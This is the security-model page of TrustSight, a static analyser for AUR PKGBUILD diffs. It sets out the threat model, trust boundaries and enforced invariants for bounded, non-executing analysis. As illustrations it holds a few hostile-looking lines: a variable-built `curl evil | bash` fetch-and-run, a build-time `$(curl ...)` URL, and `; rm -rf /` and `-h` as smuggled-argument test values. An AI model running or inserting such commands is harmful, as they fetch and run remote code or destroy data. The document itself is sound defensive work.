<!-- description: TrustSight's threat model and invariants: what a result claims, what it never claims, how each guarantee is enforced by a gate, and how to report a vulnerability. -->

# Security Model

TrustSight is an **instrument, not a judge**. It reads AUR PKGBUILD diffs, applies published detection rules (the [rules reference](reference/rules/index.md) documents every shipped rule, pattern, and severity), and reports both findings and recorded gaps. It never decides whether a package is safe or authorizes an update; a person does. A quiet result means no monitored condition matched in the material examined, not that the package is safe.

That distinction, **input not verdict**, rests on four statements the rest of this page makes precise:

- TrustSight reports on evidence, and on the absence of evidence.
- Absence of evidence is never presented as proof of safety.
- The tool's output is input to a human decision, never the decision itself.
- Errors and unknowns travel to the surface; the interface does not hide them.

The page is organised as a thesis (read this first), then the four parts that make it precise and enforceable:

- **The thesis** (below): adversary, boundaries, assumptions, guarantees, non-guarantees, the evidence taxonomy, detection versus authorization, and how uncertainty reaches the person.
- **[Part A](#part-a-trustsight-as-a-program-under-attack)**: TrustSight as a program consuming hostile input - the invariants that protect the machine.
- **[Part B](#part-b-what-the-result-claims)**: what a result claims about a package, and what it does not.
- **[Part C](#part-c-the-enforcement-map)**: every invariant above, mapped to the check that fails when it stops being true.
- **[Part D](#part-d-vulnerability-reporting)**: what counts as a vulnerability in a static analyser, and how to report one.

Nothing here is aspirational. Every invariant in Part A and Part B has an executable gate in `scripts/security_gates.py`, and the calibration properties have theirs in `scripts/calibration_gates.py`. Both run as GitHub Actions workflows (`security.yml` and `calibration.yml`) on every push **and** every pull request, and both exit non-zero when a gate fails, which fails the job. They are blocking CI checks, not pre-commit hooks and not release-only steps, so a change that breaks an invariant cannot land green. The doc-facing gates (cross references resolve, the doc and the gate list describe the same set) run in the same job; they are cheap enough to run every time. A claim without a gate is a claim this project does not make.

---

## The thesis

### The programme

A package update is a moving target: new code, new URLs, new maintainers, new build logic. TrustSight cannot audit what an update *will do*; it can only audit what the update *says*. So every analysis walks the same pipeline:

> **Parse** the PKGBUILD into a structured representation, **Analyse** it against pattern rules and context signals, **Score** the findings through an additive model, with declared practice reported at weight 0, **Classify** the result into a band, and **Report** the findings through a template, in the human-readable panel or the machine-readable JSON.

The bands are `Low`, `Medium`, `High`, `Critical` and `Inconclusive`. The
default `review` profile marks scores above 20 as flagged; `quiet` and `strict`
profiles change that queue without changing arithmetic or bands. This page uses
the default profile for workload figures. JSON carries the band in `risk` and
the separate policy in `review_profile`, `review_threshold`, and `flagged`.

**A band is not a pure function of the score, and two rules say so explicitly.** A cold database and a coverage gap both already override the arithmetic, and severity does too, in two places. First, **a CRITICAL finding floors the band at High**: CRITICAL weighs 40 and the High band opens at 51, so the sum alone can never lift a *single* CRITICAL above Medium, and a lone fork bomb or `rm -rf /` would read as a medium situation on arithmetic that says nothing about severity. The floor moves the band only - no score changes, so the calibrated separation between the benign and malicious score populations is untouched. Second, **a FATAL names itself in `risk_label`**: a FATAL caps the score at 100, so it arrives as `Critical` and so does a score that merely accumulated past 80, and those are different claims. `risk_label` reads `Critical (FATAL: R013)`. It rides the label rather than a new band because `risk` is a closed enum consumers gate on, and nothing is lost without one - the severity is in `score_breakdown` either way. Both are the shape [B4](#b4-fatal-cannot-be-switched-off) already establishes, where severity overrides arithmetic rather than adding to it.

The score and its band are computed on every run and shown on request. The default output is the findings and the change summary: what matched, where, and what changed. `--score` adds the number and the band; `--json` carries them when `--score` or `--risk` is passed, because a consumer needs the machine-readable form. That holds on every machine-readable surface, not just the one the flag was first wired to, and the API spells the same request `to_dict(include_score=True)`: see [B11](#b11-every-surface-reports-the-same-thing).

Computation is local and deterministic: the same diff, against the same stored observation history, always produces the same score and the same evidence record. The stored history is part of the instrument, not part of the input, so two machines with different seeds or different accumulated observations can score the same diff differently; that is the novelty model working, and [B1](#b1-a-score-is-a-sum-of-matched-evidence-nothing-more) makes the boundary precise. What is ruled out is any dependence on a remote service, a model, or a clock TrustSight does not control. Fetching is a separate stage with two declared destinations (`aur.archlinux.org`, and the release channel for verified `baseline-*` assets), described in detail in [the invariants](#the-invariants).

The thesis is not that this pipeline catches everything. It is the opposite: the pipeline has published limits, and **those limits are part of the output**, not a footnote. Everything below follows from that.

### Adversary

The AUR is an unmoderated, user-submitted repository. Anyone can publish, and whoever maintains a package can modify it at will. TrustSight therefore assumes the strongest realistic adversary: **someone who controls every byte of every artifact TrustSight reads about a package, and who knows this source code**. The full adversary description is in [Part A](#part-a-trustsight-as-a-program-under-attack); the practical consequence is that every read of package-controlled data is a potential attack on the machine running the tool, and the threat model is about that machine surviving contact with hostile input, detection or no detection.

**State poisoning.** The novelty and maturity signals read accumulated history, so an attacker who can influence that history (a malicious seed, a compromised baseline, or long-term manipulation of the AUR metadata the corpus is built from) can make a future attack look unexceptional: anomalous behaviour reads as established. This is a distinct attack class from the ones the rest of this page bounds. Rule evasion bypasses a pattern, a parser bypass hides a payload from the tokenizer, and coverage-gap exploitation pads past a bound; state poisoning does none of these. It desensitises the calibration itself, so it is a calibration bypass, not a detection bypass, and it is considered and bounded here rather than left implicit. The seed can only make something look more familiar; it can never rewrite state it does not own or raise a score (A12), and it carries no recoverable identity (P1). A baseline is signature-verified and writes only profiles, snapshots and metadata, never a rule, a pattern, a weight or a threshold (A13). The property that closes the class is that poisoning state can only make the present look like the past, never make a rule stop matching: a structural finding fires on the same diff whatever the history says, so the most a poisoned prior can do is quiet the novelty and longitudinal tiers, never silence the rules.

### Boundaries

TrustSight does three things, and only three: it reads, it computes, it reports.

- **Reads** the reviewed repository, the single AUR endpoint, and the signed release assets an operator explicitly asks for.
- **Computes** evidence scores, entirely locally, deterministically, and never by executing a PKGBUILD.
- **Reports** findings and their reasons, and what it could not examine.

It does **not** build, run, install, or sandbox. The moment you run `makepkg`, you are outside this model.

Two of the things it never does are worth stating on their own, because each removes an attack surface rather than defending one. It never fetches a URL a package declares, so there is no SSRF primitive to turn a reviewer into a probe. It never connects to a host a package names; the only hosts it can reach are the two declared endpoints, the literal `https://aur.archlinux.org` and the release channel at `github.com`, which is confined to `release.py` and refuses any download whose signature does not verify against the pinned key.

### Assumptions

The model above and the parts that follow are claims *about this program*: that its invariants hold when it runs. They are not claims about the machine it runs on. Like any model, this one rests on a set of assumptions, and stating them is what makes the boundary complete: a reader knows exactly where the analysis stops being the tool's responsibility.

Each of these is taken as given, not defended:

- **The Python runtime is trusted.** The interpreter, its bytecode loader, and the standard library are the substrate the analysis runs on. A compromised interpreter can do anything the process can.
- **The operating system is trusted.** The kernel, the dynamic linker, and the executable the process actually is are outside the model.
- **Local filesystem permissions are trusted.** The files TrustSight reads (its own config, the repository, the snapshots) are at the paths the operator chose and are readable because the operator's permissions say so. A hostile file at a *trusted* path is indistinguishable from a trusted file.
- **The TLS trust store is trusted.** AUR traffic is protected only against a network-level attacker; it assumes the certificate authorities in the local store are honest and the store has not been altered.
- **CI is not compromised.** The gates are meaningful because the machine that runs them is running the code they check, and exercising that code with its shipped configuration. A compromised CI is a compromised review, not a detectable one. What this project does control is the softest edge of that assumption: every workflow installs with `uv sync --locked`, so a job resolves nothing at run time and gets exactly the pinned, hashed versions in `uv.lock`. The flag matters more than it looks: `--frozen` would also install from the lock, but it performs no check that the lock still matches `pyproject.toml`, so a dependency added to the manifest and never locked is silently ignored and the job installs an older closure while appearing to honour the manifest. `--locked` fails instead. Third-party actions are pinned by commit SHA for the same reason. Neither makes CI trustworthy; both remove a live remote dependency from the job that certifies the model, and the `CI installs from the lock` gate keeps it that way.
- **The dependencies are trusted.** `rich`, `pygit2`, `typer`, `tldextract`, the Python interpreter and standard library, the `sqlite3` library and the SQLite it wraps, and the runtime's own libraries (`libc` and friends) are third-party or substrate code this project consumes and does not audit. The concrete list is repeated where Part A documents what its program-level invariants do not cover. If `rich`, `pygit2`, Python, SQLite, or `libc` is compromised, this document no longer applies. `cryptography` belongs on that list too, and is the one whose compromise is most directly a breach of a stated invariant: it verifies the Ed25519 signatures A13 and A13b rest on. Assumed does not have to mean unobserved. A weekly `supply-chain` workflow exports the locked closure, generates a CycloneDX SBOM, and reports known advisories against it. It is a **reporting** job, not a gate: it never fails a build. Making it blocking would put a remote advisory feed in the path of every push, which is exactly the live remote dependency every other workflow's `uv sync --locked` install exists to remove - and an advisory is evidence about a library, not a verdict about this program, so what it means for a static analyser that never runs a PKGBUILD is a judgement for a person. The assumption stands; what changes is that the project can now see when it stops holding.

If any of these is not true, this document no longer applies: the guarantees in Parts A and B are about the program, and the program is only as trustworthy as the layers beneath it. That is not a gap in the model, it is the model stating where its border is.

### Guarantees

What the tool promises, in one paragraph, is that its output is honest about the analysis that produced it. The specifics are in Part A and Part B, and [Part C](#part-c-the-enforcement-map) maps each to the gate that enforces it. The short list is:

- **Reproducible**: the same input, against the same stored history, the same score and evidence record.
- **Transparent**: every point is attributable to a named entry in the score breakdown, and the breakdown is part of the output. Enforced by `positive evidence never changes the score` and `report rendering is data-driven`, which together fix where a number may come from and how it may be described.
- **Fails closed on doubt**: an analysis that did not see the whole change cannot report UNFLAGGED, and its band is marked incomplete wherever a human sees it.
- **Not headline-shaped**: the default output is evidence, not a verdict. The score exists, is deterministic, and is available on request; it is not what the tool leads with, because a number invites a decision the tool is not entitled to make. Enforced by `the default output is not headline-shaped`, which renders a scoring package and fails if the default output volunteers the number.
- **Isolated**: it never fetches a URL the package named, never executes package code, never extracts a package-controlled archive to disk, and never renders untrusted text unescaped.
- **Locked**: FATAL rules cannot be turned off, and suppression is always visible.
- **Configuration is visible, not silently mutable**: the operator may tune the instrument, but not without a trace. The config fingerprint (B1) captures the effective ruleset, thresholds and overrides; FATAL rules cannot be removed without the shipped-rule fallback and a logged warning (B4); and suppressed findings are always reported (B5). A local attacker with filesystem access can edit `rules.toml` or `overrides.toml`, because local permissions are a trusted assumption, but they cannot make the change invisible: the run then carries a different fingerprint, and any suppressed or downgraded rule shows in the output. The model separates operator intent from silent tampering by observability, not by prevention.
- **Calibrated**: the gates enforce *separation*, that the benign 95th percentile stays below the malicious 5th percentile, not that one workload policy is universally correct. Fire rates against a published benign corpus are measured; the default 20-point profile and its 11.9% benign queue rate are disclosed separately (see B2). Other profiles are operator choices, not new calibration claims.

Each of these stops being a promise the moment the machine breaks it. The gates in [Part C](#part-c-the-enforcement-map) are what turn them from sentences into structural commitments.

### Non-guarantees: absence of alerts is not a certificate

An UNFLAGGED result means "no published rule matched the evidence that was actually examined". That is a statement about *detection* alone. It is not the same as "no attack is possible", and it is not, on its own, an instruction to update.

This is the easiest claim to misread. An unknown that is not visible is indistinguishable from a clean result, so incomplete analysis must always be reported. Everything in [B2](#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete) enforces that rule.

TrustSight reports what changed even when no rule matched. Otherwise, "nothing fired" would be indistinguishable from "nothing happened".

Concretely, an UNFLAGGED result does **not** claim:

- that the package is safe (only that no published rule matched what was examined);
- that the ruleset is complete (fire rates and gaps are published; detection has documented ceilings);
- that runtime behaviour was observed (nothing is executed);
- that the build will fetch what the recipe says (where that cannot be determined statically, the result is downgraded).

What it *does* do is tell you exactly which sensors tripped, which sensors are missing, and what was never examined - so the weight of the decision is yours, not the tool's. See [Part B](#part-b-what-the-result-claims) for the precise claims.

### The evidence taxonomy

Every result reduces to one of four places in a taxonomy, and the taxonomy has to be stated completely, because the tool's trustworthiness is exactly its refusal to move between them silently:

| What the tool has | Example | How it is presented |
|-------------------|---------|---------------------|
| **Known risk** | a rule matched (e.g. R013 confusable unicode) | FLAGGED, with the matching rule, file and line |
| **Declared safe evidence** | checksums declared, PGP keys declared, commit pinned | INFO, reported, never scored (B10) |
| **Evidence that is contextually uncertain** | a `source=` URL computed at build time; a file the manifest did not list | **INCONCLUSIVE** |
| **None known** | history too short to trust novelty at full weight | **INCONCLUSIVE** until warm |

The last two rows are the ones most tools are tempted to collapse into "nothing found", which is exactly the error the thesis forbids. A concrete form: the `unresolved_source` gap - a `source=` entry computed at build time, say `_url="$(curl ...)"` - means the URL the build will actually fetch is not in the analysed text. The tool records the gap, reports INCONCLUSIVE, and tells you the URL was never statically confirmable. The details of the taxonomy live in [evidence tiers](reference/evidence-tiers.md) and [what TrustSight cannot see](explanation/what-trustsight-cannot-see.md).

### Detection and authorization

Detecting is not authorizing. They are different acts, and a tool that lets the first quietly stand in for the second is making the exact substitution this model rejects.

- **Detection** is what TrustSight does: rules fire, scores compute, gaps are recorded. Its output is *input*.
- **Authorization** is what a person does: someone decides whether to update, to click, to merge. The tool does not perform that action, and no synthesized sentence from the tool performs it either.

The boundary does not disappear in CI, it moves. A pipeline still authorizes, it just does so in advance: the pipeline owner writes the decision into a gate (for example, the UNFLAGGED check **and** the coverage check), and that decision is theirs, stated in their own script, where it can be read and argued with. The tool supplies evidence and unknowns; a person decides what they are worth. Human-in-the-loop is not a slogan here, it is the operating principle: **no verdict, however emphatic, is an authorization to act.**

### Uncertainty reaches the surface

The whole model stands on one interface rule: **every unknown the tool recorded must be visible to the person it matters to, and it must never be hidden by default**.

- A coverage gap appears in the JSON and on the terminal, and is never dropped from either.
- A result that could not be examined fully is not shown as a bare "Low": for a human render the band is qualified, e.g. `High (incomplete analysis)`, and for machines `risk` and `coverage_gaps` are separate fields (see [report schema](reference/report-schema.md)).
- An analysis that failed for a tracked package is reported as "this package was NOT vetted", so a skipped package cannot read as an unflagged one.
- A result reports the changes it examined, not only the rules that fired. An update with no findings still tells you what moved, so "nothing fired" cannot read as "nothing happened".
- A failure is reported as a failure and never absorbed into a result. The exit code distinguishes "the analysis ran" from "the analysis could not run", and says nothing about what was found.

Part A states the invariants that protect the machine, Part B the limits on what a result may claim, and Part C maps every one of them to a gate. The taxonomy is the theory; the rest of this page is the enforcement.

---

## Part A: TrustSight as a program under attack

### The adversary

TrustSight reads PKGBUILDs from the AUR. The AUR is an unmoderated, user-submitted package repository: anyone can publish, and a package can be modified by whoever maintains it. So the model assumes the strongest realistic adversary for this position:

**The attacker controls, entirely and with foreknowledge of this source code, every byte of every artifact TrustSight reads about a package.** That includes the PKGBUILD, the `.install` hook, every other file in the repository, the package name, the maintainer name, the version strings, the commit metadata, the commit timestamps, and the AUR metadata entry.

The attacker also knows which rules exist, what they match, and what they do not. Detection is calibrated, published, and therefore evadable; see [what TrustSight cannot see](explanation/what-trustsight-cannot-see.md). Part A is not about whether an attack is detected. It is about what the attacker can do to the *machine running TrustSight*, and the answer must be "nothing", detection or no detection.

### The trust boundary

| Input | Trusted? | Why |
|-------|----------|-----|
| PKGBUILD, `.install`, repository tree, package and maintainer names, versions, commit metadata | **No** | Written by the party under review. |
| The AUR metadata dump and the git repository at `aur.archlinux.org` | **Transport only** | The host is fixed and reached over TLS. Its *contents* are attacker-authored and are treated as hostile input. |
| `config.toml`, `rules.toml`, `hosts.toml`, `patterns.toml`, `naming.toml`, `thresholds.toml`, `iocs.toml`, `overrides.toml` | **Yes** | Local files owned by the operator. Editing them is a supported way to tune the tool. `iocs.toml` here is the legacy exact-match list for H056; the IOC federation baselines are separate ([A13b](#part-a-trustsight-as-a-program-under-attack)). |
| The novelty seed | **Verified, conditionally** | No longer bundled in the package: it is fetched from the release channel and imported only when its detached signature verifies against the pinned distribution key. On machines without the seed it is simply absent, and first runs degrade to cold start instead of importing something unverified. The build procedure and the way the digest is checked are in [seed provenance](explanation/seed-provenance.md). It carries no plaintext identity ([P1](#part-a-trustsight-as-a-program-under-attack)). |
| Release-channel assets (`baseline-*`) | **Verified, conditionally** | Downloaded from the declared release endpoint only, with a byte cap applied while downloading. The detached Ed25519 signature then verifies against the pinned distribution key before the payload is parsed, imported, or used; verification failure is a refusal. |
| A seed or baseline given on the command line | **Operator's decision** | Passing a path is an explicit act of trust. The baseline importer verifies a signature; the seed importer records the digest of what was imported. |
| A file in the current working directory | **No** | Nothing is read from a relative path. Config and snapshots resolve under the config directory. |

### The invariants

**A1. The input is not code.** There is no `eval`, no `exec`, no `os.system`, no `shell=True`, and no unpickling anywhere in the source. Subprocesses are spawned only to ask the local `pacman` about installed packages and repository lists, to read the local repository configuration with `pacman-conf`, and to compare versions with `vercmp`. Argument lists are always a list, never a string, so there is no shell to inject into.

`vercmp` deserves stating out loud, because it is the one place in A1 the guarantee is a validation rather than a structural property. `pacman` calls take `--` to end option parsing. `vercmp` has no `--`, and its two arguments are version strings that came from the AUR, so they are attacker-influenced: a package publishing the version `-h` would otherwise put a flag on a command line. The guard is therefore the shape of the argument, checked before the spawn:

```python
_VERSION_ARG_RE = re.compile(r"^[A-Za-z0-9._+~:][A-Za-z0-9._+~:-]*$")
```

A pacman version is `[epoch:]pkgver[-pkgrel]`, so the permitted set is letters, digits, and `. _ + ~ : -`, and the first character may not be `-`. Anything that fails this never reaches a command line: it is compared in-process by `_simple_vercmp` instead. When `pyalpm` is installed, no subprocess is spawned at all and the comparison happens in-library.

The residual risk is that the shape check is an allowlist, and an allowlist can be wrong. It is tested against both directions (real versions like `1:1.1.1w-1` must pass, `-h`, `--help`, `; rm -rf /` and the empty string must fail), and passing it buys an attacker one `vercmp` argument out of a character set with no shell metacharacters in it.

**A2. The URLs a package declares are never fetched.** Downloading what a PKGBUILD points at would make every reviewer an SSRF probe, would tell the attacker exactly who is inspecting them, and would turn a review into a denial-of-service amplifier.

The analysis package is not transport-free, and it is worth being exact about what it does reach. `analysis/pipeline.py` imports `fetcher` and calls `clone_or_fetch` to obtain the package's own AUR repository, which is how the diff exists at all. What holds is narrower than "no transport": every fetch helper the analysis package may import is **keyed by package name or commit id**, never by URL. A `source=` entry is parsed, classified and scored, and there is no function in reach that would take it. So reaching the network requires naming a package, and the host is then the A3 AUR constant; the release channel is a separate module the analysis package never imports.

That is enforced rather than asserted: the gate parses every module under `src/trustsight/analysis/` and fails if any imports a raw transport library (`urllib.request`, `http.client`, `socket`, `requests`, `httpx`, `ftplib`), and it checks every name imported from a fetch module (`fetcher`, `discovery`, `full_aur.fetch`, `full_aur.metadata`) against a name-keyed allowlist so a URL-taking helper cannot be pulled in. Adding such a helper to that allowlist is the change that would reintroduce SSRF, and it fails the gate.

**A3. Two declared network hosts.** Every endpoint is a literal constant: `https://aur.archlinux.org` (the RPC, the metadata dump, the git clone, and cgit) and the release channel `https://github.com/emiliano-go/trustsight/releases` (only `release.py`, only `baseline-*` assets, only on explicit commands or the first-run auto-import of a missing seed). TrustSight never connects to a host named by the package under review, and the release host is unreachable from analysis: `release.py` is in the fetch-module allowlist that nothing under `analysis/` may import. The analysis itself is local and deterministic, as the thesis describes; fetching is a separate stage, with those two destinations, and the release channel's one rule is that a download that does not verify against the pinned key is refused, never imported.

Cloning executes nothing. Repositories are fetched through `pygit2` (libgit2) with a working tree, because the diff is computed against the fetched checkout; libgit2 runs no git hooks on clone, and TrustSight configures no `clean`, `smudge` or `fsmonitor` filter, the git-config-driven paths where a fetch can otherwise become an execution. This documents a property the library already has rather than a control this project adds; per the assumptions, a compromised `pygit2` is outside the model.

**A4. Every read is bounded.** Every request has a timeout. Every response has a byte cap, the AUR RPC included: `discovery._load_rpc_json` reads at most `_MAX_RPC_BYTES` (64 MiB) before parsing, and a reply past the cap is caught and degrades to "query failed" rather than being buffered into `json.load`, so a hostile or malfunctioning endpoint cannot exhaust memory even though the RPC returns metadata rather than content a rule matches. The metadata dump has its own 512 MiB response cap and a 1 GiB decompression ceiling (`full_aur.metadata`). Decompression is capped before it is materialised, tar members are walked lazily with a ceiling, the seed import refuses to expand past its limit, and the diff is truncated at a configured size. Release assets are downloaded with the `release._MAX_RELEASE_BYTES` (512 MiB) cap, then their detached signatures are verified before parsing, importing, or using their payloads. A remote end never decides how much of this machine's memory or time to use.

Two of those bounds are worth stating separately, because in both cases an earlier check *looked* like the bound and was not.

**A read with no size is the other end choosing the size.** Reading a tar member with a bare `read()` allocates whatever the member's header declares, and that header is written by the party under review. The response cap upstream does not help, because it applies to the *compressed* body: gzip on compressible content runs to about a thousand to one, so 32 MiB on the wire is tens of gigabytes of member. Every read of a stream therefore carries a size, and a read without one is refused by a gate over the whole source rather than by an audit of the call sites known today. The ceilings are `full_aur.fetch.MAX_TAR_MEMBER_BYTES` for a snapshot member and `db.MAX_SEED_MEMBER_BYTES` for a seed archive member; the latter tightens a total-size check that already bounded the archive as a whole, so that no single member can claim the whole budget at once.

**An artifact is bounded before it is verified, not after.** A signature is computed over the bytes of the thing it signs, so verification cannot run until those bytes are read: a bound placed after the check guards nothing, and the same holds for a digest recorded for attribution (A12) and for a decompression cap that only ever sees an already-materialised buffer. The reads that precede a check are bounded by `ioc_baseline.MAX_BASELINE_BYTES`, `full_aur.export.MAX_ARTIFACT_BYTES` and `db.MAX_SEED_BYTES`.

Both refuse rather than truncate. A truncated read is a complete-looking one with its tail quietly removed, which is the seam A5 and A6 already refuse for the same reason. An over-cap seed or baseline aborts its import. An over-cap snapshot member is declined and the fetch falls back to the cgit text path, which means the analysis still produces a result - so that refusal is recorded as the `snapshot_refused` coverage gap and everything in [B2](#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete) then applies: the run cannot report UNFLAGGED, and the gap is shown with the band.

`full-aur` and `full-aur --watch` change the *volume* of this, not its shape. A watch loop makes many requests to the one host in A3 over hours or days, so the bounds above are per-request and the loop adds two of its own: a configured interval with a 60-second floor, and an optional cycle count. Each cycle is an ordinary analysis; nothing about running on a timer relaxes A1 through A13.

Source URLs are bounded before they are classified. A hostname's real limits are DNS's - 253 bytes and 127 labels - and classification walked every label and computed every parent domain, which is quadratic in label count: one 8 KiB host of dots cost 421 ms, and with `MAX_URLS_PER_SIDE` allowing 4,096 URLs a single package could spend around half an hour there. `buckets.MAX_HOST_BYTES` and `MAX_HOST_LABELS` bound it, and labels are dropped from the *left* so the registrable domain - the part every classification decision reads - survives. Truncating rather than refusing is deliberate: refusing an over-length host would let a homograph domain be padded past the check.

**A4b. The differ and companion reads are bounded.** The differ has its own local bounds, and they bound what is *allocated* rather than what is kept. `patch.text` materialises a whole patch, so the cap that matters runs *before* that call: a delta whose declared file size on either side exceeds `differ.MAX_PATCH_SOURCE_BYTES` is skipped without its text ever being requested, which is the only bound available ahead of the allocation. A patch is at most the changed lines plus context, so a file small on both sides cannot yield a large one. Text that is read is then capped at `MAX_PATCH_BYTES`, the retained total at `MAX_GENERATED_DIFF_BYTES`, the number of patches visited at `MAX_DIFF_PATCHES`, and the summary at `MAX_DIFF_SUMMARY_FILES` - the summary walks every delta regardless of the text cap, so a wide repository would otherwise choose the size of a stored `fact_json`. Companion discovery is bounded the same way: the PKGBUILD blob's size is checked before `blob.data` is touched (`MAX_PKG_BUILD_BYTES`), the tree walk that selects companions stops at `MAX_COMPANION_TREE_ENTRIES`, and a referenced basename past `MAX_COMPANION_NAME_BYTES`, or carrying any path structure, is refused rather than rendered into a hunk header. The generator returns its own truncation flag rather than letting the caller infer one: a patch it declined to retain leaves the assembled text at or under the cap, so measuring that text would report a complete analysis while content had been skipped, which is the silent skip [B2](#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete) forbids. Policy omission is not truncation - a `.png` the filter never reads leaves nothing unexamined, while a `.install` dropped at a cap does, and only the second sets the flag. What these bounds do not cover is libgit2's own diff construction: `repo.diff()` builds the diff object before any of this runs, and its cost is a property of the repository rather than of TrustSight. That sits inside [the dependency assumption](#assumptions) - `pygit2` is trusted substrate - and it is stated here rather than implied, because the bounds above are on what *this* program allocates and it would be easy to read them as more. Companion files are capped at `MAX_COMPANION_BYTES` and `MAX_COMPANION_FILES`; paths and extracted URL tokens have fixed byte/count limits. Companion blobs are size-checked before their bytes are read. URL lists and file-change summaries are sorted before reporting, so repository traversal order cannot change a result. Malformed hunk headers and content outside a valid hunk are ignored rather than mapped to a fabricated location. If the pipeline's combined diff cap truncates output, `diff_truncated` remains a visible coverage gap and the result cannot read as clean.

**A4c. API inputs are bounded.** The public API applies equivalent input bounds before initialization: package and indicator names are capped at 256 UTF-8 bytes, PKGBUILD and metadata text at 5 MiB, repositories at 256 names, and package/history collections at 10,000 entries. Invalid types, booleans used as numeric limits, negative values, and oversized inputs fail with `ValueError` before database or network work.

There is deliberately **no hook, callback, or notification command**: nothing in TrustSight spawns an operator-supplied program, with or without findings on stdin. That is worth stating because it is a natural thing to want from a watch loop, and a natural thing to add carelessly. If it is ever added it belongs in this part with its boundary written down, because such a hook would receive attacker-influenced JSON (package names, maintainer names, quoted evidence) and the operator's script would own what happens next. Today the only subprocesses are the `pacman`, `pacman-conf` and `vercmp` calls in A1.

**A5. Matching is bounded, and the bound is recorded.** Rule patterns are regexes running over attacker-written text, so the input is clamped to `rules.MAX_RULE_LINE_BYTES` (8 KiB) per line before matching. That bounds every pattern at once, including ones added later, in a way that no per-pattern audit can.

The clamp applies to both rule engines. The patterns in `rules.toml` go through `apply_rules`; the larger set emitted from `analysis/` matches the diff text directly, and `rules.clamp_text` bounds that text before it gets there. That distinction is not cosmetic: while only the first was clamped, one 5 MiB line cost 0.17s through `apply_rules` and 15s through the code-emitted rules.

A clamp is also a truncation seam: a payload placed past byte 8192 of a single line is not matched. A bound that silently drops content is exactly the class of skip B2 exists to prevent, so it does not stay silent. A diff containing any over-length line records the `line_truncated` coverage gap, and everything in B2 then applies: the run cannot report UNFLAGGED, and the gap is shown with the band. Lines are joined across backslash continuations before this is measured, so the limit applies to the logical line an attacker actually controls.

Two hostile shapes cost differently, and the gate measures both. One enormous *line* is cheap, because the clamp cuts it to 8 KiB before any pattern runs. The same byte budget spread over many *lines* pays the whole ruleset per line, and is the more expensive shape by a wide margin - measuring only the first left the second unmeasured. Both are bounded by `[diff] max_diff_bytes`, and a diff that reaches it records `diff_truncated`; the ceiling on the many-line probe exists to catch a rule turning accidentally quadratic, which is the regression that would make an ordinary diff expensive.

The current runtime uses Python's standard `re` module. This is a deliberate dependency boundary: the input clamp is applied before both TOML-configured and code-emitted patterns, and the security gates exercise adversarial matching time. The project does not claim that input clamping proves every pattern is linear. The next regex hardening step is comparative: audit the shipped and configured patterns, add per-pattern adversarial cases, and benchmark the standard engine against a bounded alternative before changing the runtime dependency. A replacement such as the third-party `regex` package is not an automatic improvement; it expands the trusted dependency set and must first demonstrate lower worst-case cost, compatible syntax, deterministic behavior, and acceptable packaging and maintenance risk.

At runtime, a configured rule pattern that exceeds the bounded adversarial probe budget is refused by the rule compiler and contributes no finding. This is a fail-closed safety decision for the pattern, not a claim that the rule matched cleanly. The configured rules remain subject to the rule linter, while the source and dynamic pattern families remain covered by the repository-wide audit gate. The optional comparison tool is `scripts/benchmark_regex_engines.py`; it reports that `regex` is unavailable unless the operator installs it separately, so the production dependency set does not change as part of benchmarking.

**A6. Expansion is bounded and never indirect.** The tokenizer resolves shell variables so that a payload assembled from `C=curl; $C evil | bash` still reaches the rules. That makes it the second parser eating hostile input, and the one with an amplification property the regex engine does not have: `b=$a$a` doubles per level, so a chain of them grows as `2**depth`, and a 517-byte PKGBUILD was once enough to OOM the process. Four bounds apply: `_MAX_EXPANSION_PASSES` (16 rewrites, each resolving one innermost `${...}`), `_MAX_VALUE_LEN` (8 KiB for one value), `_MAX_LINE_LEN` (64 KiB for one resolved line), and `_MAX_TABLE_BYTES` (1 MiB for the variable table as a whole).

The important half is what happens at the bound. **A value that would exceed the bound is left unexpanded and never truncated.** An unexpanded `$payload` is reported as an unresolved pattern; a truncated one would look like a fully resolved string with its tail quietly removed, which is the same failure mode as A5's seam and is refused for the same reason.

Two forms are never resolved at all: indirect expansion `${!name}`, which would let a value choose which variable is read, and length `${#name}`. Both return unresolved rather than a guess.

Line continuations are joined before any of this runs, and they are joined **verbatim**. A backslash-newline is *removed* by the shell rather than being whitespace, so `cur\` followed by `l ...` is `curl ...`; joining with an inserted space produced `cur l ...`, which splits a command name into two words and hides it from every rule that matches one. Indentation on the continuation line is kept as written, so arguments stay separated. There are two joiners - one for the coverage path and an indexed one the rule path uses - and they must agree, because a diff read two ways is a diff one of them reads wrongly.

**A7. Rendering data is data.** A finding's plain-English text is a template keyed by rule id, filled with named fields from the finding's evidence. Field values are substituted, never re-expanded and never evaluated: a value with `{0.__class__}` renders as those characters. No template is ever drawn from package-controlled text, and a template missing a field falls back to the finding's reason instead of raising, so one malformed finding cannot abort a batch.

No language model renders a verdict. Rendering is deterministic and local, which is a security property rather than a stylistic one: it gives the output path no network dependency, no nondeterminism, and **no prompt-injection surface**. There is no model in this program for a package to talk to. R012 still detects injection aimed at whoever reads the diff, because the target of that attack is the human reviewer.

**A8. No archive member is written to a path the archive chose.** Snapshot tarballs - the ones carrying package-controlled content - are walked in memory, member by member, and nothing from them is written to disk at all: for that surface there is no path-traversal question because there is no extraction.

One archive is written to disk, and pretending otherwise would be the kind of gap this page exists to close. A v2 seed archive is expanded by `db._extract_v2_archive`, because the importer reads a directory of files. It is not handed to `extract()` or `extractall()`: each member is checked before it is written, and the checks are the containment. A member whose name is absolute or contains `..` is refused, as is any symlink, hardlink, device or FIFO member, so the destination is the only place a write can land. The member count and the archive's total declared size are bounded (`MAX_SEED_MEMBERS`, `MAX_SEED_BYTES`), and each member is bounded again as it is read (`MAX_SEED_MEMBER_BYTES`). What the gate enforces is the narrow, precise thing: no member's own name is ever passed to an extractor. Note what this does *not* rest on - the trust anchor for a seed is A12, which bounds what an imported seed may write to the database whatever the archive contained.

**A9. SQL is parameterised.** Every value reaches SQLite as a bound parameter. The only interpolation into statement text is an identifier drawn from a literal list in the same module, because SQLite cannot bind a table name.

